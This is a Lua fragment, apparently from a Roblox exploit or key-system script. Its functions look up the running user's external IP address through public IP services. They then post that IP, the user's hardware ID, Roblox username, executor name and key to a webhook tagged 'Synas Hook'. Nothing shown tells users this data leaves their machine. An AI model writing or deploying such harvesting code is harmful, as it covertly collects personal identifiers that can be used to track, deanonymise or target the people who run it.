local function fetchExternalIP()
    local ip = "Unknown"
    local urls = {"https://api.ipify.org?format=json","https://ifconfig.me/ip","https://api.my-ip.io/ip"}
    for _, url in ipairs(urls) do
        local ok, body = pcall(function()
            if syn and syn.request then return syn.request({Url=url,Method="GET"}).Body
            elseif http and http.request then return http.request({Url=url,Method="GET"}).Body
            elseif request then return request({Url=url,Method="GET"}).Body
            else return game:HttpGet(url) end
        end)
        if ok and body then
            local parsed
            pcall(function() parsed = HttpService:JSONDecode(body) end)
            if type(parsed)=="table" and parsed.ip then ip=parsed.ip break end
            local raw = tostring(body):gsub("%s+","")
            if raw~="" then ip=raw break end
        end
    end
    return ip
end

local function sendWebhook(title,data,color)
    local desc = ("Key: %s\nIP: %s\nExecutor: %s\nHWID: %s\nRoblox Username: %s"):format(
        data.Key or "Unknown",
        data.IP or "Unknown",
        data.Executor or "Unknown",
        data.HWID or "Unknown",
        data.RobloxUsername or "Unknown"
    )
    local embed = {
        ["embeds"]={{["title"]=title,["description"]=desc,["color"]=color or 16711680,["footer"]={["text"]="Synas Hook"},["timestamp"]=os.date("!%Y-%m-%dT%H:%M:%S")}}
    }
    local body = HttpService:JSONEncode(embed)
    pcall(function()
        if syn and syn.request then syn.request({Url=Webhook,Method="POST",Headers={["Content-Type"]="application/json"},Body=body})
        elseif http and http.request then http.request({Url=Webhook,Method="POST",Headers={["Content-Type"]="application/json"},Body=body})
        elseif request then request({Url=Webhook,Method="POST",Headers={["Content-Type"]="application/json"},Body=body})
        else pcall(function() game:GetService("HttpService"):PostAsync(Webhook,body) end)
        end
    end)
end

